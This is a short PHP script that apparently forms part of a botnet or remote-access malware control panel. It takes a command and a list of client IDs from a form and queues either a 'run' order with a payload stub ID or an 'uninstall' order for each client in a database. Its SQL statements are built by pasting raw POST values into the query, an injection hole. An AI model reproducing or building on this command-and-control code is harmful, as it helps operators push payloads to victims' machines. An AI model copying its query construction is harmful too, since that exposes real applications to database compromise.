<?php

session_start();
include('./database/db-config.php');
include("./database/db-conn.php");
if(!isset($_POST['command']) || !isset($_POST['check']))
{
    $_SESSION['command-fail'] = true;
    header('location: /');
    die();
}

$command = $_POST['command'];
$clients = $_POST['check'];
$succesMessage = "Executed ". $command . " on clients: ";

if($command == "run")
{    
    if(isset($_POST['payload']))
    {
        $stubid = $_POST['payload'];   
        foreach ($clients as $key => $id) {
        $sql = "INSERT INTO command (Client_Id, Command, StubId) VALUES(" . $id . ", '".$command."', '".$stubid."') ON DUPLICATE KEY UPDATE Client_Id=$id, Command='$command', StubId=$stubid";
        $dbconn->exec($sql);
        $succesMessage.= $id . ",";
    }

    $succesMessage = substr_replace($succesMessage, "", -1);
    $_SESSION['command-succes'] = $succesMessage;    
    }
    else
    {
        $_SESSION['command-error'] = true;
    }
}
else if($command == "uninstall")
{
    foreach ($clients as $key => $id) {
        $sql = "INSERT INTO command (Client_Id, Command) VALUES(" . $id . ", '".$command."') ON DUPLICATE KEY UPDATE Client_Id=$id, Command='$command'";
        $dbconn->exec($sql);
        $succesMessage.= $id . ",";
    }
    
}

header('location: /');
die();

?>